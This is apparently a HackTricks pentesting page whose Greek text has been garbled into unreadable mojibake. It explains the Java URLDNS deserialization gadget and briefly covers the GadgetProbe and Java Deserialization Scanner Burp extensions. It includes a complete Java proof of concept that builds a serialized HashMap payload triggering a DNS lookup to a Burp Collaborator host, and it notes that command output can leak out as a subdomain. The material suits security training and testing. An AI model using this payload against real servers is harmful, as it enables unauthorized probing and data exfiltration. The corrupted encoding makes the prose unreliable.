# Î‘Ï€Î¿ÏƒÏ…ÏƒÎºÎµÏ…Î¿Î¸Î­Ï„Î·ÏƒÎ· DNS ÏƒÎµ Java, GadgetProbe ÎºÎ±Î¹ Î£Î±ÏÏ‰Ï„Î®Ï‚ Î‘Ï€Î¿ÏƒÏ…ÏƒÎºÎµÏ…Î¿Î¸Î­Ï„Î·ÏƒÎ·Ï‚ Java

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF**, ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>

## Î‘Î¯Ï„Î·ÏƒÎ· DNS ÎºÎ±Ï„Î¬ Ï„Î·Î½ Î±Ï€Î¿ÏƒÏ…ÏƒÎºÎµÏ…Î¿Î¸Î­Ï„Î·ÏƒÎ·

Î— ÎºÎ»Î¬ÏƒÎ· `java.net.URL` Ï…Î»Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿ `Serializable`, Î±Ï…Ï„ÏŒ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Î±Ï…Ï„Î® Î· ÎºÎ»Î¬ÏƒÎ· Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Ï€Î¿ÏƒÏ…ÏƒÎºÎµÏ…Î¿Î¸ÎµÏ„Î·Î¸ÎµÎ¯.
```java
public final class URL implements java.io.Serializable {
```
Î‘Ï…Ï„Î® Î· ÎºÎ»Î¬ÏƒÎ· Î­Ï‡ÎµÎ¹ Î­Î½Î± **Ï€ÎµÏÎ¯ÎµÏÎ³Î¿ ÏƒÏ…Î¼Ï€ÎµÏÎ¹Ï†Î¿ÏÎ¬**. Î£ÏÎ¼Ï†Ï‰Î½Î± Î¼Îµ Ï„Î·Î½ Ï„ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ·: "**Î”ÏÎ¿ ÎºÏŒÎ¼Î²Î¿Î¹ Î¸ÎµÏ‰ÏÎ¿ÏÎ½Ï„Î±Î¹ Î¹ÏƒÎ¿Î´ÏÎ½Î±Î¼Î¿Î¹ ÎµÎ¬Î½ ÎºÎ±Î¹ Î¿Î¹ Î´ÏÎ¿ Î¿Î½Î¿Î¼Î±ÏƒÎ¯ÎµÏ‚ ÎºÏŒÎ¼Î²Ï‰Î½ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î±Î½Î±Î»Ï…Î¸Î¿ÏÎ½ ÏƒÏ„Î¹Ï‚ Î¯Î´Î¹ÎµÏ‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ IP**".\
ÎˆÏ„ÏƒÎ¹, ÎºÎ¬Î¸Îµ Ï†Î¿ÏÎ¬ Ï€Î¿Ï… Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ URL ÎºÎ±Î»ÎµÎ¯ **Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ** Î±Ï€ÏŒ Ï„Î¹Ï‚ **ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ `equals`** Î® **`hashCode`**, Î¸Î± Î±Ï€Î¿ÏƒÏ„Î­Î»Î»ÎµÏ„Î±Î¹ Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± **DNS** Î³Î¹Î± Î½Î± Î»Î·Ï†Î¸ÎµÎ¯ Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· IP.

Î•Î¯Î½Î±Î¹ Î±ÏÎºÎµÏ„Î¬ ÎµÏÎºÎ¿Î»Î¿ Î½Î± ÎºÎ±Î»Î­ÏƒÎµÏ„Îµ Ï„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· **`hashCode`** Î±Ï€ÏŒ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ **URL**, Î±ÏÎºÎµÎ¯ Î½Î± ÎµÎ¹ÏƒÎ¬Î³ÎµÏ„Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± `HashMap` Ï€Î¿Ï… Î¸Î± Î±Ï€Î¿Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸ÎµÎ¯. Î‘Ï…Ï„ÏŒ ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹ ÎµÏ€ÎµÎ¹Î´Î® **ÏƒÏ„Î¿ Ï„Î­Î»Î¿Ï‚** Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ **`readObject`** Î±Ï€ÏŒ Ï„Î¿ `HashMap`, ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎºÏÎ´Î¹ÎºÎ±Ï‚:
```java
private void readObject(java.io.ObjectInputStream s)
throws IOException, ClassNotFoundException {
[   ...   ]
for (int i = 0; i < mappings; i++) {
[   ...   ]
putVal(hash(key), key, value, false, false);
}
```
Î˜Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Ï„Î·Î½ `putVal` Î¼Îµ ÎºÎ¬Î¸Îµ Ï„Î¹Î¼Î® Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ `HashMap`. Î©ÏƒÏ„ÏŒÏƒÎ¿, Ï€Î¹Î¿ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÎ® ÎµÎ¯Î½Î±Î¹ Î· ÎºÎ»Î®ÏƒÎ· Ï„Î·Ï‚ `hash` Î¼Îµ ÎºÎ¬Î¸Îµ Ï„Î¹Î¼Î®. Î‘Ï…Ï„ÏŒÏ‚ ÎµÎ¯Î½Î±Î¹ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ `hash`:
```java
static final int hash(Object key) {
int h;
return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```
ÎŒÏ€Ï‰Ï‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€Î±ÏÎ±Ï„Î·ÏÎ®ÏƒÎµÏ„Îµ, **ÎºÎ±Ï„Î¬ Ï„Î·Î½ Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·** ÎµÎ½ÏŒÏ‚ **`HashMap`**, Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· `hash` Î¸Î± **ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯ Î¼Îµ ÎºÎ¬Î¸Îµ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿** ÎºÎ±Î¹ **ÎºÎ±Ï„Î¬ Ï„Î· Î´Î¹Î¬ÏÎºÎµÎ¹Î±** Ï„Î·Ï‚ ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚ Ï„Î·Ï‚ **`hash`**, Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯ Ï„Î¿ `.hashCode()` Ï„Î¿Ï… Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï…. Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î±Î½ Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î­Î½Î± **`HashMap`** Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ **URL**, Ï„Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ **URL** Î¸Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Ï„Î¿ `.hashCode()`.

Î¤ÏÏÎ±, Î±Ï‚ ÏÎ¯Î¾Î¿Ï…Î¼Îµ Î¼Î¹Î± Î¼Î±Ï„Î¹Î¬ ÏƒÏ„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Ï„Î¿Ï… `URLObject.hashCode()`:
```java
public synchronized int hashCode() {
if (hashCode != -1)
return hashCode;

hashCode = handler.hashCode(this);
return hashCode;
```
ÎŒÏ€Ï‰Ï‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ, ÏŒÏ„Î±Î½ Î­Î½Î± `URLObject` ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Ï„Î·Î½ `.hashCode()`, ÎºÎ±Î»ÎµÎ¯Ï„Î±Î¹ `hashCode(this)`. Î£Ï…Î½ÎµÏ‡Î¯Î¶Î¿Î½Ï„Î±Ï‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚:
```java
protected int hashCode(URL u) {
int h = 0;

// Generate the protocol part.
String protocol = u.getProtocol();
if (protocol != null)
h += protocol.hashCode();

// Generate the host part.
InetAddress addr = getHostAddress(u);
[   ...   ]
```
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î­Î½Î± `getHostAddress` ÏƒÏ„Î¿Î½ Ï„Î¿Î¼Î­Î±, **ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚ Î­Î½Î± ÎµÏÏÏ„Î·Î¼Î± DNS**.

Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î±Ï…Ï„Î® Î· ÎºÎ»Î¬ÏƒÎ· Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯** Î³Î¹Î± Î½Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹** Î­Î½Î± **ÎµÏÏÏ„Î·Î¼Î± DNS** Î³Î¹Î± Î½Î± **Î±Ï€Î¿Î´ÎµÎ¯Î¾ÎµÎ¹** ÏŒÏ„Î¹ Î· **Î±Ï€Î¿ÏƒÏ…ÏƒÎºÎµÏ…Î¿Ï€Î¿Î¯Î·ÏƒÎ·** ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„Î®, Î® Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Î³Î¹Î± Î½Î± **ÎµÎ¾Î±Ï†Î±Î½Î¯ÏƒÎµÎ¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚** (Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ Ï‰Ï‚ Ï…Ï€Î¿Ï„Î¿Î¼Î­Î± Ï„Î·Î½ Î­Î¾Î¿Î´Î¿ ÎµÎ½ÏŒÏ‚ ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¹Î¼Î¿Ï… ÎµÎ½Ï„Î¿Î»ÏÎ½).

### Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÎºÏÎ´Î¹ÎºÎ± Ï€Î»Î·ÏÏ‰Î¼Î®Ï‚ URLDNS

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î¿Î½ [ÎºÏÎ´Î¹ÎºÎ± Ï€Î»Î·ÏÏ‰Î¼Î®Ï‚ URDNS Î±Ï€ÏŒ Ï„Î¿ ysoserial ÎµÎ´Ï](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java). Î©ÏƒÏ„ÏŒÏƒÎ¿, Î±Ï€Î»Î¬ Î³Î¹Î± Î½Î± Ï„Î¿ ÎºÎ±Ï„Î±Î½Î¿Î®ÏƒÎµÏ„Îµ ÎµÏ…ÎºÎ¿Î»ÏŒÏ„ÎµÏÎ± Ï€ÏÏ‚ Î½Î± Ï„Î¿ ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ, Î´Î·Î¼Î¹Î¿ÏÏÎ³Î·ÏƒÎ± Ï„Î¿ Î´Î¹ÎºÏŒ Î¼Î¿Ï… PoC (Î²Î±ÏƒÎ¹ÏƒÎ¼Î­Î½Î¿ ÏƒÏ„Î¿ PoC Ï„Î¿Ï… ysoserial):
```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

public class URLDNS {
public static void GeneratePayload(Object instance, String file)
throws Exception {
//Serialize the constructed payload and write it to the file
File f = new File(file);
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
out.writeObject(instance);
out.flush();
out.close();
}
public static void payloadTest(String file) throws Exception {
//Read the written payload and deserialize it
ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
Object obj = in.readObject();
System.out.println(obj);
in.close();
}

public static void main(final String[] args) throws Exception {
String url = "http://3tx71wjbze3ihjqej2tjw7284zapye.burpcollaborator.net";
HashMap ht = new HashMap(); // HashMap that will contain the URL
URLStreamHandler handler = new SilentURLStreamHandler();
URL u = new URL(null, url, handler); // URL to use as the Key
ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

// During the put above, the URL's hashCode is calculated and cached.
// This resets that so the next time hashCode is called a DNS lookup will be triggered.
final Field field = u.getClass().getDeclaredField("hashCode");
field.setAccessible(true);
field.set(u, -1);

//Test the payloads
GeneratePayload(ht, "C:\\Users\\Public\\payload.serial");
}
}


class SilentURLStreamHandler extends URLStreamHandler {

protected URLConnection openConnection(URL u) throws IOException {
return null;
}

protected synchronized InetAddress getHostAddress(URL u) {
return null;
}
}
```
### Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚

* [https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
* Î£Ï„Î·Î½ Î±ÏÏ‡Î¹ÎºÎ® Î¹Î´Î­Î±, Ï„Î¿ payload Ï„Î·Ï‚ commons collections Î¬Î»Î»Î±Î¾Îµ Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î¼Î¹Î± Î±Î½Î±Î¶Î®Ï„Î·ÏƒÎ· DNS, Î±Ï…Ï„ÏŒ Î®Ï„Î±Î½ Î»Î¹Î³ÏŒÏ„ÎµÏÎ¿ Î±Î¾Î¹ÏŒÏ€Î¹ÏƒÏ„Î¿ Î±Ï€ÏŒ Ï„Î·Î½ Ï€ÏÎ¿Ï„ÎµÎ¹Î½ÏŒÎ¼ÎµÎ½Î· Î¼Î­Î¸Î¿Î´Î¿, Î±Î»Î»Î¬ Î±Ï…Ï„Î® ÎµÎ¯Î½Î±Î¹ Î· Î±Î½Î¬ÏÏ„Î·ÏƒÎ·: [https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)

## GadgetProbe

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ [**GadgetProbe**](https://github.com/BishopFox/GadgetProbe) Î±Ï€ÏŒ Ï„Î¿ Burp Suite App Store (Extender).

Î¤Î¿ **GadgetProbe** Î¸Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÎ¹ Î½Î± ÎºÎ±Ï„Î±Î»Î¬Î²ÎµÎ¹ Î±Î½ ÎºÎ¬Ï€Î¿Î¹ÎµÏ‚ **ÎºÎ»Î¬ÏƒÎµÎ¹Ï‚ Java Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½** ÏƒÏ„Î·Î½ ÎºÎ»Î¬ÏƒÎ· Java Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®, Î­Ï„ÏƒÎ¹ ÏÏƒÏ„Îµ Î½Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ **Î±Î½** ÎµÎ¯Î½Î±Î¹ **ÎµÏ…Î¬Î»Ï‰Ï„Î¿Ï‚** ÏƒÎµ ÎºÎ¬Ï€Î¿Î¹Î± Î³Î½Ï‰ÏƒÏ„Î® ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·.

### Î ÏÏ‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯

Î¤Î¿ **GadgetProbe** Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¿ Î¯Î´Î¹Î¿ **DNS payload** Ï„Î·Ï‚ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î·Ï‚ ÎµÎ½ÏŒÏ„Î·Ï„Î±Ï‚, Î±Î»Î»Î¬ **Ï€ÏÎ¹Î½** Î±Ï€ÏŒ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î¿Ï… DNS query Î¸Î± **Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÎ¹ Î½Î± Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Î¼Î¹Î± Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î· ÎºÎ»Î¬ÏƒÎ·**. Î‘Î½ Î· **Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î· ÎºÎ»Î¬ÏƒÎ· Ï…Ï€Î¬ÏÏ‡ÎµÎ¹**, Ï„Î¿ **DNS query** Î¸Î± Î±Ï€Î¿ÏƒÏ„Î±Î»ÎµÎ¯ ÎºÎ±Î¹ Ï„Î¿ GadgetProbe Î¸Î± ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÎµÎ¹ ÏŒÏ„Î¹ Î±Ï…Ï„Î® Î· ÎºÎ»Î¬ÏƒÎ· Ï…Ï€Î¬ÏÏ‡ÎµÎ¹. Î‘Î½ Ï„Î¿ **Î±Î¯Ï„Î·Î¼Î± DNS Î´ÎµÎ½ Î±Ï€Î¿ÏƒÏ„Î±Î»ÎµÎ¯ Ï€Î¿Ï„Î­**, Î±Ï…Ï„ÏŒ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Î· **Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î· ÎºÎ»Î¬ÏƒÎ· Î´ÎµÎ½ Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î®Î¸Î·ÎºÎµ** Î¼Îµ ÎµÏ€Î¹Ï„Ï…Ï‡Î¯Î±, Î¿Ï€ÏŒÏ„Îµ ÎµÎ¯Ï„Îµ Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÎµÎ¯Ï„Îµ Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ **Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î®ÏƒÎ¹Î¼Î·/ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎ¹Î¼Î·**.

ÎœÎ­ÏƒÎ± ÏƒÏ„Î¿ github, Ï„Î¿ [**GadgetProbe Î­Ï‡ÎµÎ¹ Î¼ÎµÏÎ¹ÎºÎ¬ wordlists**](https://github.com/BishopFox/GadgetProbe/tree/master/wordlists) Î¼Îµ ÎºÎ»Î¬ÏƒÎµÎ¹Ï‚ Java Î³Î¹Î± Î½Î± Î´Î¿ÎºÎ¹Î¼Î±ÏƒÏ„Î¿ÏÎ½.

![https://github.com/BishopFox/GadgetProbe/blob/master/assets/intruder4.gif](<../../.gitbook/assets/intruder4 (1) (1) (1).gif>)

### Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚

* [https://know.bishopfox.com/research/gadgetprobe](https://know.bishopfox.com/research/gadgetprobe)

## Î£Î±ÏÏ‰Ï„Î®Ï‚ Î‘Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ Java

Î‘Ï…Ï„ÏŒÏ‚ Î¿ ÏƒÎ±ÏÏ‰Ï„Î®Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÎ¹** Î±Ï€ÏŒ Ï„Î¿ Burp App Store (**Extender**).\
Î— **ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ·** Î­Ï‡ÎµÎ¹ **Ï€Î±Î¸Î·Ï„Î¹ÎºÎ­Ï‚** ÎºÎ±Î¹ ÎµÎ½ÎµÏÎ³Î­Ï‚ **Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„ÎµÏ‚**.

### Î Î±Î¸Î·Ï„Î¹ÎºÎ­Ï‚

Î‘Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® **ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Ï€Î±Î¸Î·Ï„Î¹ÎºÎ¬** ÏŒÎ»Î± Ï„Î± Î±Î¹Ï„Î®Î¼Î±Ï„Î± ÎºÎ±Î¹ Ï„Î¹Ï‚ Î±Ï€Î±Î½Ï„Î®ÏƒÎµÎ¹Ï‚ Ï€Î¿Ï… ÏƒÏ„Î­Î»Î½Î¿Î½Ï„Î±Î¹ **ÏˆÎ¬Ï‡Î½Î¿Î½Ï„Î±Ï‚** Î³Î¹Î± **Î¼Î±Î³Î¹ÎºÎ¬ bytes Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ Java** ÎºÎ±Î¹ Î¸Î± ÎµÎ¼Ï†Î±Î½Î¯ÏƒÎµÎ¹ Î¼Î¹Î± Ï€ÏÎ¿ÎµÎ¹Î´Î¿Ï€Î¿Î¯Î·ÏƒÎ· ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±Ï‚ Î±Î½ Î²ÏÎµÎ¸ÎµÎ¯ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ:

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](<../../.gitbook/assets/image (290).png>)

### Î•Î½ÎµÏÎ³Î­Ï‚

**Î§ÎµÎ¹ÏÎ¿ÎºÎ¯Î½Î·Ï„Î¿Ï‚ ÎˆÎ»ÎµÎ³Ï‡Î¿Ï‚**

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÏ€Î¹Î»Î­Î¾ÎµÏ„Îµ Î­Î½Î± Î±Î¯Ï„Î·Î¼Î±, Î´ÎµÎ¾Î¯ ÎºÎ»Î¹Îº ÎºÎ±Î¹ `Î‘Ï€Î¿ÏƒÏ„Î¿Î»Î® Î±Î¹Ï„Î®Î¼Î±Ï„Î¿Ï‚ ÏƒÏ„Î¿ DS - Î§ÎµÎ¹ÏÎ¿ÎºÎ¯Î½Î·Ï„Î¿Ï‚ ÎˆÎ»ÎµÎ³Ï‡Î¿Ï‚`.\
Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î¼Î­ÏƒÎ± ÏƒÏ„Î·Î½ ÎºÎ±ÏÏ„Î­Î»Î± _Deserialization Scanner_ --> _ÎšÎ±ÏÏ„Î­Î»Î± Î§ÎµÎ¹ÏÎ¿ÎºÎ¯Î½Î·Ï„Î¿Ï… ÎµÎ»Î­Î³Ï‡Î¿Ï…_ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÏ€Î¹Î»Î­Î¾ÎµÏ„Îµ Ï„Î¿ **ÏƒÎ·Î¼ÎµÎ¯Î¿ ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î®Ï‚**. ÎšÎ±Î¹ **Î¾ÎµÎºÎ¹Î½Î®ÏƒÏ„Îµ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿** (Î•Ï€Î¹Î»Î­Î¾Ï„Îµ Ï„Î·Î½ ÎºÎ±Ï„Î¬Î»Î»Î·Î»Î· ÎµÏ€Î¯Î¸ÎµÏƒÎ· Î±Î½Î¬Î»Î¿Î³Î± Î¼Îµ Ï„Î· Ï‡ÏÎ®ÏƒÎ· ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚).

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](../../.gitbook/assets/3-1.png)

